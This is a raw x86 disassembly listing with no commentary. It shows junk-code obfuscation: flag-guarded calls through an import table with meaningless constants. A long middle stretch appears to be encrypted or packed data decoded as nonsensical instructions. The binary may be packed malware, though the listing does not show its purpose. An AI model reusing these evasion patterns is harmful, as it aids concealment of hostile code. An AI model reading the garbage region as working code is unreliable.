  41efa3:	mov    edx,0x6b4f
  41efa8:	jmp    0x41f000
  41efad:	mov    DWORD PTR ds:0x4282fb,0x78fa
  41efb7:	cmp    DWORD PTR ds:0x42830b,0x0
  41efbe:	jb     0x41efe4
  41efc4:	push   DWORD PTR [ebp-0x1c]
  41efc7:	push   0x74cd
  41efcc:	push   0x4a2f
  41efd1:	call   DWORD PTR ds:0x428e2c
  41efd7:	sub    edx,DWORD PTR ds:0x42823f
  41efdd:	inc    edx
  41efde:	and    edx,DWORD PTR ds:0x42825b
  41efe4:	mov    DWORD PTR ds:0x4283a3,0x703b
  41efee:	and    edx,DWORD PTR ds:0x42824b
  41eff4:	xor    edx,DWORD PTR ds:0x4282b7
  41effa:	and    DWORD PTR ds:0x4283b7,edx
  41f000:	and    eax,ecx
  41f002:	sub    eax,0x2818
  41f007:	mov    DWORD PTR [ebp-0xe8],eax
  41f00d:	jmp    0x41f369
  41f012:	adc    al,0x29
  41f015:	fstp   DWORD PTR [ebx]
  41f017:	and    BYTE PTR [edx+0x3a],ah
  41f01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f01b:	repz mov ebx,0x651228b0
  41f021:	mov    esp,0x18162999
  41f026:	mov    ds:0x81181812,eax
  41f02b:	idiv   DWORD PTR ds:0x65da29df
  41f031:	leave  
  41f032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f033:	icebp  
  41f034:	sbb    eax,0x1a99f3dd
  41f039:	mov    bl,0xaf
  41f03b:	shl    BYTE PTR [edi+0x65fd76d9],0x44
  41f042:	test   ch,bl
  41f044:	jecxz  0x41f087
  41f046:	pop    ds
  41f047:	sub    DWORD PTR [edi+0xf9d7a5c],ebp
  41f04d:	pop    ds
  41f04e:	fldenv [edx+0x6984e8c3]
  41f054:	pop    ebp
  41f055:	or     al,0x57
  41f057:	jl     0x41f054
  41f059:	inc    edi
  41f05a:	jae    0x41f089
  41f05c:	scas   eax,DWORD PTR es:[edi]
  41f05d:	inc    esp
  41f05e:	push   esp
  41f05f:	scas   eax,DWORD PTR es:[edi]
  41f060:	jns    0x41f00c
  41f062:	and    esp,edi
  41f064:	ror    dh,0x4b
  41f067:	sub    DWORD PTR [edi],edx
  41f069:	mov    dh,al
  41f06b:	cmp    eax,0x6a9512f2
  41f070:	ins    BYTE PTR es:[edi],dx
  41f071:	mov    eax,ds:0x9157cd4b
  41f076:	jno    0x41f0b6
  41f078:	mov    ecx,0x896325ba
  41f07d:	jns    0x41f0bc
  41f07f:	pop    ebx
  41f080:	xor    bh,BYTE PTR [esi-0x6a]
  41f083:	int3   
  41f084:	xor    bl,BYTE PTR [ebx+eax*1+0x6435d324]
  41f08b:	addr16 aam 0x37
  41f08e:	cmp    ch,BYTE PTR [edi+0x51]
  41f091:	or     eax,0x98aeb718
  41f096:	inc    ah
  41f098:	enter  0x6369,0x36
  41f09c:	xchg   ecx,eax
  41f09d:	(bad)  
  41f09e:	jmp    0x41f073
  41f0a0:	outs   dx,BYTE PTR ds:[esi]
  41f0a1:	mov    ds:0xea4e8b8,al
  41f0a6:	into   
  41f0a7:	mul    ebp
  41f0a9:	jne    0x41f09e
  41f0ab:	pop    ds
  41f0ac:	pop    edx
  41f0ad:	popa   
  41f0ae:	cld    
  41f0af:	imul   eax,DWORD PTR cs:[ecx+0x1808591a],0x80888987
  41f0ba:	jae    0x41f10b
  41f0bc:	outs   dx,BYTE PTR ds:[esi]
  41f0bd:	cwde   
  41f0be:	sub    DWORD PTR [ebx-0x72bd78e8],0x39305ce2
  41f0c8:	mov    ebx,0xca2cbbbc
  41f0cd:	dec    edi
  41f0ce:	jp     0x41f060
  41f0d0:	fs xchg edx,eax
  41f0d2:	xchg   BYTE PTR [eax-0x73],dh
  41f0d5:	inc    ebx
  41f0d6:	sbb    edi,DWORD PTR [edi-0x1c]
  41f0d9:	fld    DWORD PTR [edx-0x36fdc7cb]
  41f0df:	stos   DWORD PTR es:[edi],eax
  41f0e0:	pop    ds
  41f0e1:	mov    ah,0x66
  41f0e3:	pop    ds
  41f0e4:	pusha  
  41f0e5:	addr16 pop ebx
  41f0e7:	and    esp,DWORD PTR gs:[edx+0x3d]
  41f0eb:	pop    DWORD PTR [edi-0x3d85bd37]
  41f0f1:	sbb    DWORD PTR [esi],ebx
  41f0f3:	or     ebx,DWORD PTR [edi+0x39]
  41f0f6:	ss leave 
  41f0f8:	add    eax,0xfc330984
  41f0fd:	pop    edx
  41f0fe:	ins    BYTE PTR es:[edi],dx
  41f0ff:	mov    dl,0xe3
  41f101:	inc    esp
  41f102:	bnd jno 0x41f0d7
  41f105:	mul    al
  41f107:	icebp  
  41f108:	loope  0x41f0cd
  41f10a:	add    eax,0x8555d1f3
  41f10f:	sub    edi,DWORD PTR [ecx]
  41f111:	das    
  41f112:	imul   edx,DWORD PTR [edi-0x48f9e4e5],0xffffffcb
  41f119:	pop    edi
  41f11a:	fsubp  st(1),st
  41f11c:	repz jmp 0x8f9b:0xd5378aff
  41f124:	mov    dh,0x85
  41f126:	rol    BYTE PTR [ebx],0x74
  41f129:	xchg   ecx,eax
  41f12a:	and    edi,ebx
  41f12c:	fs enter 0xe128,0x1d
  41f131:	mov    eax,ds:0x850fe030
  41f136:	stos   BYTE PTR es:[edi],al
  41f137:	cmp    al,0xe5
  41f139:	mov    DWORD PTR [edx-0x76d230],ecx
  41f13f:	inc    edi
  41f140:	mov    WORD PTR [edi],ss
  41f142:	xchg   BYTE PTR [ecx+0x63],dl
  41f145:	cmp    eax,0x32c4e2b
  41f14a:	js     0x41f0e7
  41f14c:	xchg   edi,eax
  41f14d:	pop    edx
  41f14e:	fld    DWORD PTR [edx+0xe]
  41f152:	push   esp
  41f153:	adc    bh,BYTE PTR [edx]
  41f155:	or     bh,ah
  41f157:	in     al,dx
  41f158:	jge    0x41f0e9
  41f15a:	pop    ss
  41f15b:	jg     0x41f15e
  41f15d:	gs cmp eax,0x5d97d342
  41f163:	jo     0x41f150
  41f165:	or     eax,0xb57df6f6
  41f16a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f16b:	cmp    ecx,DWORD PTR [edi]
  41f16d:	cmp    eax,0x2f6347c6
  41f172:	or     bh,BYTE PTR [esi+0x78b06fd4]
  41f178:	pop    edx
  41f179:	ins    DWORD PTR es:[edi],dx
  41f17a:	push   ds
  41f17b:	mov    bl,0xe
  41f17d:	adc    BYTE PTR [ebx+0x4822dcf],ch
  41f183:	mov    ah,BYTE PTR gs:[edi-0xb1f4c9f]
  41f18a:	leave  
  41f18b:	lods   eax,DWORD PTR ds:[esi]
  41f18c:	test   dh,bh
  41f18e:	stos   DWORD PTR es:[edi],eax
  41f18f:	jge    0x41f19f
  41f191:	lods   al,BYTE PTR ds:[esi]
  41f192:	out    dx,eax
  41f193:	imul   eax,DWORD PTR [eax+0x6b08b361],0xffffffaf
  41f19a:	and    BYTE PTR [esi-0x6cba4969],dl
  41f1a0:	repnz push esi
  41f1a2:	mov    ecx,0xd25a70d1
  41f1a7:	inc    ebp
  41f1a8:	loopne 0x41f206
  41f1aa:	lds    ebp,FWORD PTR [esi]
  41f1ac:	hlt    
  41f1ad:	(bad)  
  41f1af:	and    esp,DWORD PTR [edi]
  41f1b1:	in     al,dx
  41f1b2:	mov    WORD PTR [edx+0x68],ss
  41f1b5:	xor    DWORD PTR [edx+esi*4-0x48f77c06],edx
  41f1bc:	add    ah,BYTE PTR [ebx-0x61]
  41f1bf:	adc    DWORD PTR [ebp+0x56],0x9
  41f1c3:	and    BYTE PTR [edx-0x5e9a0b0e],cl
  41f1c9:	cld    
  41f1ca:	cmc    
  41f1cb:	nop
  41f1cc:	add    dh,BYTE PTR [ecx+0x766ec5fa]
  41f1d2:	jecxz  0x41f179
  41f1d4:	inc    esp
  41f1d5:	sub    cl,cl
  41f1d7:	iret   
  41f1d8:	push   esp
  41f1d9:	mov    ch,0x18
  41f1db:	dec    ecx
  41f1dc:	stos   BYTE PTR es:[edi],al
  41f1dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1de:	xor    BYTE PTR [edx],dh
  41f1e0:	daa    
  41f1e1:	mov    bl,0x58
  41f1e3:	mov    ebx,0xb2057213
  41f1e8:	dec    ebp
  41f1e9:	xchg   ebp,eax
  41f1ea:	xchg   DWORD PTR [ebx-0x2f],ebx
  41f1ed:	or     ebp,DWORD PTR [ebx+0x77]
  41f1f0:	pop    ebx
  41f1f1:	xchg   ecx,eax
  41f1f2:	add    bh,BYTE PTR [edx]
  41f1f4:	sbb    DWORD PTR [ecx],ebp
  41f1f6:	push   0xffd4c996
  41f1fb:	cwde   
  41f1fc:	xor    eax,0x18664dc5
  41f201:	pop    esp
  41f202:	ror    DWORD PTR ds:0xf1281d4d,cl
  41f208:	loopne 0x41f194
  41f20a:	or     BYTE PTR [eax],cl
  41f20c:	cmp    ch,BYTE PTR [eax-0x20]
  41f20f:	push   cs
  41f210:	(bad)  
  41f211:	leave  
  41f212:	outs   dx,BYTE PTR ds:[esi]
  41f213:	aad    0x3
  41f215:	scas   al,BYTE PTR es:[edi]
  41f216:	sub    eax,0xa34e12af
  41f21b:	jecxz  0x41f1e2
  41f21d:	mov    ch,0x10
  41f21f:	mov    al,ds:0x77477a1b
  41f224:	lods   eax,DWORD PTR ds:[esi]
  41f225:	jo     0x41f212
  41f227:	rcr    DWORD PTR [edx-0x44],cl
  41f22a:	sahf   
  41f22b:	ss inc edi
  41f22d:	inc    edi
  41f22e:	xor    esp,esi
  41f230:	loopne 0x41f20c
  41f232:	cld    
  41f233:	retf   
  41f234:	mov    eax,DWORD PTR [ebx-0xd85e545]
  41f23a:	jbe    0x41f2a8
  41f23c:	arpl   cx,bx
  41f23e:	inc    ebx
  41f23f:	pop    edx
  41f240:	cwde   
  41f241:	rol    DWORD PTR [ecx+ebp*8+0x6edddcf7],cl
  41f248:	and    esp,DWORD PTR [edx-0x36df066f]
  41f24e:	sbb    al,0xa6
  41f250:	aam    0xcc
  41f252:	pop    ecx
  41f253:	out    dx,eax
  41f254:	sub    eax,0x2c30f25
  41f259:	sub    BYTE PTR [eax+edi*2],bl
  41f25c:	and    ah,BYTE PTR ds:0x90c0b6ed
  41f262:	ds shr ch,cl
  41f265:	jb     0x41f2b8
  41f267:	inc    eax
  41f268:	arpl   WORD PTR [edx],bp
  41f26a:	rcr    ecx,cl
  41f26c:	jns    0x41f266
  41f26e:	cdq    
  41f26f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f270:	and    al,0x34
  41f272:	scas   eax,DWORD PTR es:[edi]
  41f273:	js     0x41f2e0
  41f275:	and    eax,0x6c236173
  41f27a:	xchg   edx,eax
  41f27b:	popf   
  41f27c:	or     eax,0x4889f944
  41f281:	jecxz  0x41f22e
  41f283:	push   0xffffffe9
  41f285:	dec    esi
  41f286:	test   DWORD PTR [edx],ebp
  41f288:	pusha  
  41f289:	and    DWORD PTR [edi],esp
  41f28b:	(bad)  
  41f28c:	mov    edi,0x6a3bb73f
  41f291:	mov    edx,0x2f5799aa
  41f296:	sbb    al,0x1c
  41f298:	scas   al,BYTE PTR es:[edi]
  41f299:	pop    es
  41f29a:	mov    bh,0xa6
  41f29c:	or     bl,BYTE PTR [edi+0x38]
  41f29f:	push   edx
  41f2a0:	dec    edi
  41f2a1:	xchg   ebp,eax
  41f2a2:	jno    0x41f225
  41f2a4:	repz or al,0xf6
  41f2a7:	fwait
  41f2a8:	loope  0x41f29e
  41f2aa:	sbb    eax,0x48638a5d
  41f2af:	cmp    BYTE PTR ds:0x584d571,bl
  41f2b5:	push   eax
  41f2b6:	sub    al,0xa9
  41f2b8:	(bad)  
  41f2ba:	adc    DWORD PTR [esi],esp
  41f2bc:	lea    edx,[eax+eax*1+0x26]
  41f2c0:	sti    
  41f2c1:	das    
  41f2c2:	call   0x84a9a7c4
  41f2c7:	mov    dl,0xf0
  41f2c9:	xchg   edx,eax
  41f2ca:	or     DWORD PTR [eax-0x7a98470d],edi
  41f2d0:	inc    esp
  41f2d1:	repnz xchg ecx,eax
  41f2d3:	or     dl,BYTE PTR [ebx-0x4b]
  41f2d6:	shl    DWORD PTR ds:0xe56aaa72,cl
  41f2dc:	xchg   ah,dl
  41f2de:	dec    eax
  41f2df:	pop    esp
  41f2e0:	fsub   QWORD PTR [eax+0x2c9c6cbc]
  41f2e6:	stos   BYTE PTR es:[edi],al
  41f2e7:	test   eax,0xc0e6e502
  41f2ec:	cmp    eax,0x163e7d3a
  41f2f1:	jbe    0x41f2f7
  41f2f3:	cmp    esp,DWORD PTR [ebx]
  41f2f5:	retf   
  41f2f6:	add    edi,DWORD PTR [ebx+esi*8+0x74]
  41f2fa:	xchg   esi,eax
  41f2fb:	loope  0x41f36e
  41f2fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2fe:	repnz sbb BYTE PTR [ecx+0x59],al
  41f302:	cmp    al,0xc1
  41f304:	xlat   BYTE PTR ds:[ebx]
  41f305:	mov    edx,esp
  41f307:	and    BYTE PTR [edx-0x25db0015],cl
  41f30d:	jne    0x41f29c
  41f30f:	mov    esp,0xf3034263
  41f314:	cmp    eax,0x48c410c3
  41f319:	je     0x41f34f
  41f31b:	jmp    0x123df8f1
  41f320:	pop    edi
  41f321:	mov    ah,0x2e
  41f323:	es fcmovbe st,st(6)
  41f326:	std    
  41f327:	or     dh,al
  41f329:	div    BYTE PTR [edx+eiz*1]
  41f32c:	mov    BYTE PTR [ebp-0x3fe7323],dl
  41f332:	pop    edi
  41f333:	sub    eax,0xd2142cfb
  41f338:	js     0x41f301
  41f33a:	xor    edx,DWORD PTR [edi+0x6d32d566]
  41f340:	les    edi,FWORD PTR ds:0x27614d4
  41f346:	in     eax,dx
  41f347:	call   DWORD PTR [edx-0x46]
  41f34a:	mov    edi,cs
  41f34c:	pop    ds
  41f34d:	aas    
  41f34e:	xchg   esi,eax
  41f34f:	js     0x41f2f1
  41f351:	dec    ebx
  41f352:	xor    ah,BYTE PTR [eax+0xc6c2cfd]
  41f358:	jbe    0x41f2de
  41f35a:	(bad)  
  41f35c:	mov    WORD PTR [edi+0x11],fs
  41f35f:	dec    eax
  41f360:	pop    ds
  41f361:	out    0xe8,eax
  41f363:	scas   al,BYTE PTR es:[edi]
  41f364:	mov    eax,DWORD PTR [ebx-0x38ecdaf6]
  41f36a:	inc    ebp
  41f36b:	nop
  41f36c:	mov    DWORD PTR [edi+0x0],ebp
  41f36f:	add    BYTE PTR [ebx+0x4283233d],al
  41f375:	add    BYTE PTR [eax],al
  41f377:	movzx  edx,WORD PTR ds:0x42823f
  41f37e:	mov    ecx,DWORD PTR ds:0x428287
  41f384:	mov    ecx,DWORD PTR ds:0x428273
  41f38a:	jmp    0x41f3f3
  41f38f:	not    eax
  41f391:	mov    DWORD PTR ds:0x42825f,ebx
  41f397:	cmp    DWORD PTR ds:0x428323,0x0
  41f39e:	jbe    0x41f3dd
  41f3a4:	push   DWORD PTR [ebp-0x14]
  41f3a7:	push   DWORD PTR [ebp-0x28]
  41f3aa:	push   DWORD PTR [ebp-0x10]
  41f3ad:	push   0x428133
  41f3b2:	push   0x1cee
  41f3b7:	push   0x479c
  41f3bc:	push   0x8744
  41f3c1:	call   DWORD PTR ds:0x428e30
  41f3c7:	sub    ecx,DWORD PTR ds:0x428257
  41f3cd:	mov    DWORD PTR ds:0x4281a7,0x2f55
  41f3d7:	and    DWORD PTR ds:0x428303,ebx
  41f3dd:	or     DWORD PTR ds:0x42831b,ecx
  41f3e3:	xor    edx,edx
  41f3e5:	or     edx,DWORD PTR ds:0x4281af
  41f3eb:	mov    edx,DWORD PTR [edx]
  41f3ed:	sbb    DWORD PTR ds:0x428337,edx
  41f3f3:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41f3fd:	mov    DWORD PTR [ebp-0x120],0x3c77
  41f407:	mov    DWORD PTR [ebp-0x2c],0x2129
  41f40e:	or     DWORD PTR ds:0x42818f,0x8a7
  41f418:	mov    eax,DWORD PTR [ebp-0x2c]
  41f41b:	imul   eax,eax,0x1ada
  41f421:	cmp    DWORD PTR ds:0x42839b,0x0
  41f428:	mov    DWORD PTR ds:0x42832f,0xae0
  41f432:	mov    DWORD PTR ds:0x42816b,ebx
  41f438:	mov    ecx,DWORD PTR ds:0x42838b
  41f43e:	jmp    0x41f484
  41f443:	mov    DWORD PTR ds:0x428313,ebx
  41f449:	mov    DWORD PTR ds:0x42818f,0x2430
  41f453:	cmp    DWORD PTR ds:0x42839b,0x0
  41f45a:	ja     0x41f47c
  41f460:	push   DWORD PTR [ebp-0x18]
  41f463:	push   0x427f45
  41f468:	call   DWORD PTR ds:0x428eb4
  41f46e:	sub    ecx,0x6218
  41f474:	inc    DWORD PTR ds:0x4283a7
  41f47a:	add    edx,edx
  41f47c:	or     edx,ecx
  41f47e:	sub    edx,0x9ad
  41f484:	mov    ecx,DWORD PTR [ebp-0x120]
  41f48a:	cmp    DWORD PTR ds:0x4281a7,0x0
  41f491:	not    edx
  41f493:	mov    DWORD PTR ds:0x4282ff,0x6486
  41f49d:	mov    DWORD PTR ds:0x42826b,0x7a92
  41f4a7:	mov    DWORD PTR ds:0x42829b,ebx
  41f4ad:	jmp    0x41f510
  41f4b2:	mov    DWORD PTR ds:0x4283a3,0x24a4
  41f4bc:	cmp    DWORD PTR ds:0x4281a7,0x0
  41f4c3:	ja     0x41f4ed
  41f4c9:	push   0x42800b
  41f4ce:	push   DWORD PTR [ebp-0x10]
  41f4d1:	call   DWORD PTR ds:0x428e34
  41f4d7:	neg    DWORD PTR ds:0x42819b
  41f4dd:	and    DWORD PTR ds:0x42827f,0x428303
  41f4e7:	and    DWORD PTR ds:0x42837f,edi
  41f4ed:	movzx  edx,BYTE PTR ds:0x428197
  41f4f4:	sbb    edx,DWORD PTR ds:0x42831f
  41f4fa:	mov    DWORD PTR ds:0x428197,edx
  41f500:	sub    DWORD PTR ds:0x428293,0x2ffe
  41f50a:	and    edx,0x4c8b
  41f510:	imul   ecx,ecx,0x53ae
  41f516:	and    DWORD PTR ds:0x42819f,ebx
  41f51c:	imul   ecx,ecx,0x7447
  41f522:	mov    edx,DWORD PTR [ebp-0xd0]
  41f528:	sbb    DWORD PTR ds:0x4283a3,0x1933
  41f532:	and    ecx,edx
  41f534:	cmp    DWORD PTR ds:0x428183,0x0
  41f53b:	mov    DWORD PTR ds:0x42839f,0x38cb
  41f545:	mov    edx,0x66af
  41f54a:	not    edx
  41f54c:	jmp    0x41f5db
  41f551:	mov    DWORD PTR ds:0x42825f,0x6044
  41f55b:	not    DWORD PTR ds:0x42826b
  41f561:	cmp    DWORD PTR ds:0x428183,0x0
  41f568:	jg     0x41f5a9
  41f56e:	push   0x13fa
  41f573:	push   DWORD PTR [ebp-0x18]
  41f576:	push   0x47c2
  41f57b:	push   DWORD PTR [ebp-0x1c]
  41f57e:	push   0x5b80
  41f583:	push   DWORD PTR [ebp-0x10]
  41f586:	push   0x6360
  41f58b:	push   0x2aad
  41f590:	push   DWORD PTR [ebp-0x28]
  41f593:	push   DWORD PTR [ebp-0x10]
  41f596:	call   DWORD PTR ds:0x428e38
  41f59c:	inc    edx
  41f59d:	adc    DWORD PTR ds:0x428163,edi
  41f5a3:	and    DWORD PTR ds:0x4282fb,ecx
  41f5a9:	movzx  edx,WORD PTR ds:0x428313
  41f5b0:	add    edx,DWORD PTR ds:0x42830b
  41f5b6:	mov    DWORD PTR ds:0x428313,edx
  41f5bc:	add    DWORD PTR ds:0x428307,0x7749
  41f5c6:	adc    DWORD PTR ds:0x42826b,0x1ba
  41f5d0:	dec    edx
  41f5d1:	sub    DWORD PTR ds:0x42839f,0x6520
  41f5db:	or     ecx,0x2a20
  41f5e1:	mov    DWORD PTR ds:0x4281ab,0x1cbf
  41f5eb:	mov    edx,DWORD PTR [ebp-0x70]
  41f5ee:	adc    DWORD PTR ds:0x42832f,0x2406
  41f5f8:	xor    ecx,edx
  41f5fa:	or     DWORD PTR ds:0x42831f,ecx
  41f600:	mov    edx,DWORD PTR [ebp+0x14]
  41f603:	adc    DWORD PTR ds:0x4283a3,0x652b
  41f60d:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41f614:	xor    DWORD PTR ds:0x428267,0x49e9
  41f61e:	lea    eax,[ecx+eax*1-0x45a1]
  41f625:	cmp    DWORD PTR ds:0x42827b,0x0
  41f62c:	mov    ecx,0x2e1f
  41f631:	mov    DWORD PTR ds:0x428297,ecx
  41f637:	mov    ecx,0x173d
  41f63c:	not    DWORD PTR ds:0x428263
  41f642:	jmp    0x41f698
  41f647:	mov    DWORD PTR ds:0x4282af,0x35b0
  41f651:	cmp    DWORD PTR ds:0x42827b,0x0
  41f658:	jae    0x41f680
  41f65e:	push   0x2832
  41f663:	call   DWORD PTR ds:0x428e3c
  41f669:	dec    ecx
  41f66a:	or     DWORD PTR ds:0x42823b,0x127d
  41f674:	mov    ecx,DWORD PTR ds:0x428307
  41f67a:	add    DWORD PTR ds:0x42832b,ecx
  41f680:	sbb    DWORD PTR ds:0x42829f,ebx
  41f686:	mov    ecx,DWORD PTR ds:0x428173
  41f68c:	adc    DWORD PTR ds:0x428167,ecx
  41f692:	and    ecx,0x3d62
  41f698:	mov    DWORD PTR [ebp-0xb0],eax
  41f69e:	mov    ecx,DWORD PTR ds:0x4283cf
  41f6a4:	mov    ecx,DWORD PTR [ecx]
  41f6a6:	xor    DWORD PTR ds:0x42825f,ecx
  41f6ac:	mov    DWORD PTR [ebp-0x11c],0x303f
  41f6b6:	not    eax
  41f6b8:	mov    DWORD PTR [ebp-0x98],0x51a9
  41f6c2:	sub    DWORD PTR ds:0x428333,0x1cf2
  41f6cc:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41f6d6:	xor    eax,ecx
  41f6d8:	mov    eax,DWORD PTR [ebp-0xcc]
  41f6de:	cmp    DWORD PTR ds:0x428317,0x0
  41f6e5:	mov    DWORD PTR ds:0x42831f,0x6375
  41f6ef:	not    DWORD PTR ds:0x42817f
  41f6f5:	mov    DWORD PTR ds:0x42823b,ecx
  41f6fb:	jmp    0x41f76f
  41f700:	mov    DWORD PTR ds:0x42824b,0x2351
  41f70a:	mov    DWORD PTR ds:0x42828f,ebx
  41f710:	cmp    DWORD PTR ds:0x428317,0x0
  41f717:	jb     0x41f758
  41f71d:	push   0x3851
  41f722:	push   0x42827b
  41f727:	call   DWORD PTR ds:0x428e40
  41f72d:	movzx  ecx,WORD PTR ds:0x42824b
  41f734:	xor    DWORD PTR ds:0x4283b7,ecx
  41f73a:	mov    ecx,DWORD PTR ds:0x42827b
  41f740:	add    ecx,DWORD PTR ds:0x428273
  41f746:	mov    DWORD PTR ds:0x42827b,ecx
  41f74c:	mov    ecx,DWORD PTR ds:0x42828b
  41f752:	adc    DWORD PTR ds:0x42839b,ecx
  41f758:	inc    ecx
  41f759:	xor    DWORD PTR ds:0x428337,ebx
  41f75f:	sub    DWORD PTR ds:0x428197,edx
  41f765:	and    DWORD PTR ds:0x428317,0x3308
  41f76f:	xor    eax,0x6f65
  41f774:	add    DWORD PTR ds:0x42832b,edx
  41f77a:	mov    ecx,DWORD PTR [ebp-0x98]
  41f780:	add    DWORD PTR ds:0x428397,0x42830b
  41f78a:	or     eax,ecx
  41f78c:	and    DWORD PTR ds:0x428247,0x3807
  41f796:	add    eax,0x161e
  41f79b:	or     ecx,DWORD PTR ds:0x428257
  41f7a1:	mov    ecx,DWORD PTR [ebp-0x11c]
  41f7a7:	add    DWORD PTR ds:0x42824b,0x4281a7
  41f7b1:	or     eax,ecx
  41f7b3:	add    DWORD PTR ds:0x428397,edi
  41f7b9:	add    eax,0x1cca
  41f7be:	or     ecx,DWORD PTR ds:0x428297
  41f7c4:	xor    eax,0x96c9
  41f7c9:	mov    DWORD PTR [ebp-0x38],eax
  41f7cc:	cmp    DWORD PTR ds:0x4283a3,0x0
  41f7d3:	mov    ecx,DWORD PTR ds:0x428387
  41f7d9:	mov    DWORD PTR ds:0x42837b,ecx
  41f7df:	mov    DWORD PTR ds:0x42831f,0x7d57
  41f7e9:	jmp    0x41f8c3
  41f7ee:	mov    DWORD PTR ds:0x42829f,0xe1
  41f7f8:	mov    DWORD PTR ds:0x428197,edi
  41f7fe:	cmp    DWORD PTR ds:0x4283a3,0x0
  41f805:	jne    0x41f836
  41f80b:	push   DWORD PTR [ebp-0xc]
  41f80e:	push   0x427f8a
  41f813:	push   0x427ef1
  41f818:	call   DWORD PTR ds:0x428eb8
  41f81e:	sub    ecx,ecx
  41f820:	xor    ecx,ecx
  41f822:	add    ecx,DWORD PTR ds:0x4283cb
  41f828:	mov    ecx,DWORD PTR [ecx]
  41f82a:	add    DWORD PTR ds:0x428287,ecx
  41f830:	adc    DWORD PTR ds:0x42816f,edi
  41f836:	and    DWORD PTR ds:0x4283af,0x3101
  41f840:	mov    DWORD PTR ds:0x4283b7,0x28b7
  41f84a:	cmp    DWORD PTR ds:0x42817f,0x0
  41f851:	mov    ecx,DWORD PTR ds:0x42826f
  41f857:	mov    DWORD PTR ds:0x42825b,0x4504
  41f861:	mov    DWORD PTR ds:0x42838f,0x3c46
  41f86b:	mov    ecx,DWORD PTR ds:0x4283b3
  41f871:	jmp    0x41f8c3
  41f876:	mov    DWORD PTR ds:0x42831f,ebx
  41f87c:	cmp    DWORD PTR ds:0x42817f,0x0
  41f883:	jge    0x41f8b3
  41f889:	push   0x1
  41f88b:	push   0x427fbc
  41f890:	push   0x427fc6
  41f895:	call   DWORD PTR ds:0x428ebc
  41f89b:	and    DWORD PTR ds:0x428197,ebx
  41f8a1:	add    ecx,ecx
  41f8a3:	adc    DWORD PTR ds:0x42831f,0x1bb
  41f8ad:	and    ecx,DWORD PTR ds:0x4283b3
  41f8b3:	sub    ecx,0x5232
  41f8b9:	sub    DWORD PTR ds:0x428187,0x6c90
  41f8c3:	mov    DWORD PTR [ebp-0x118],0x6083
  41f8cd:	or     DWORD PTR ds:0x428277,ebx
  41f8d3:	mov    DWORD PTR [ebp-0x88],0x556
  41f8dd:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41f8e7:	mov    eax,DWORD PTR [ebp-0x140]
  41f8ed:	add    eax,0x5af8
  41f8f2:	xor    DWORD PTR ds:0x42838b,0x37e5
  41f8fc:	mov    ecx,DWORD PTR [ebp-0x88]
  41f902:	sub    DWORD PTR ds:0x428173,0x4283af
  41f90c:	sub    eax,ecx
  41f90e:	dec    DWORD PTR ds:0x428287
  41f914:	mov    ecx,DWORD PTR [ebp-0x118]
  41f91a:	lea    eax,[eax+ecx*1+0x68dc]
  41f921:	or     eax,0x52f6
  41f926:	adc    ecx,DWORD PTR ds:0x42823f
  41f92c:	sub    eax,0x1dbfe
  41f931:	mov    DWORD PTR [ebp-0xac],eax
  41f937:	cmp    DWORD PTR ds:0x428303,0x0
  41f93e:	mov    DWORD PTR ds:0x428313,0x63c0
  41f948:	mov    DWORD PTR ds:0x4281a3,0x2316
  41f952:	mov    ecx,0x40fd
  41f957:	jmp    0x41f99f
  41f95c:	mov    eax,ds:0x4282af
  41f961:	mov    eax,0x5fd6
  41f966:	cmp    DWORD PTR ds:0x428303,0x0
  41f96d:	je     0x41f98d
  41f973:	call   DWORD PTR ds:0x428ec0
  41f979:	sbb    DWORD PTR ds:0x4283b3,0x209
  41f983:	xor    DWORD PTR ds:0x4283a3,0x72db
  41f98d:	add    ecx,ecx
  41f98f:	and    DWORD PTR ds:0x42829f,0x6064
  41f999:	or     ecx,0x4aaa
  41f99f:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41f9a6:	mov    DWORD PTR [ebp-0x100],0x49f7
  41f9b0:	xor    ecx,eax
  41f9b2:	mov    eax,DWORD PTR [ebp-0x100]
  41f9b8:	movzx  ecx,WORD PTR ds:0x4281a3
  41f9bf:	or     DWORD PTR ds:0x42838f,ecx
  41f9c5:	add    eax,0x7b60
  41f9ca:	cmp    DWORD PTR ds:0x428307,0x0
  41f9d1:	mov    DWORD PTR ds:0x42824b,0x756d
  41f9db:	mov    DWORD PTR ds:0x428303,0x1d60
  41f9e5:	jmp    0x41fa41
  41f9ea:	mov    ecx,DWORD PTR ds:0x42830b
  41f9f0:	cmp    DWORD PTR ds:0x428307,0x0
  41f9f7:	jg     0x41fa21
  41f9fd:	push   0x59e0
  41fa02:	call   DWORD PTR ds:0x428e44
  41fa08:	adc    DWORD PTR ds:0x42839f,ebx
  41fa0e:	sbb    DWORD PTR ds:0x428323,ebx
  41fa14:	movzx  ecx,WORD PTR ds:0x42837b
  41fa1b:	add    DWORD PTR ds:0x42838b,ecx
  41fa21:	add    DWORD PTR ds:0x428383,0x77eb
  41fa2b:	or     DWORD PTR ds:0x428303,0x2dfb
  41fa35:	mov    ecx,DWORD PTR ds:0x4282af
  41fa3b:	and    DWORD PTR ds:0x42816f,ecx
  41fa41:	imul   eax,eax,0x5ea
  41fa47:	mov    ecx,DWORD PTR [ebp-0x6c]
  41fa4a:	add    DWORD PTR ds:0x42825b,0x42819b
  41fa54:	imul   eax,ecx
  41fa57:	xor    edx,edx
  41fa59:	mov    ecx,0x3218d
  41fa5e:	div    ecx
  41fa60:	or     DWORD PTR ds:0x4282a3,edx
  41fa66:	sub    eax,0x24c1
  41fa6b:	mov    DWORD PTR [ebp-0xa8],eax
  41fa71:	cmp    DWORD PTR ds:0x428287,0x0
  41fa78:	mov    ecx,0x571f
  41fa7d:	mov    DWORD PTR ds:0x428317,edi
  41fa83:	jmp    0x41faef
  41fa88:	mov    eax,ds:0x4281a7
  41fa8d:	mov    DWORD PTR ds:0x42819f,0x4079
  41fa97:	cmp    DWORD PTR ds:0x428287,0x0
  41fa9e:	jb     0x41fac8
  41faa4:	push   0x428093
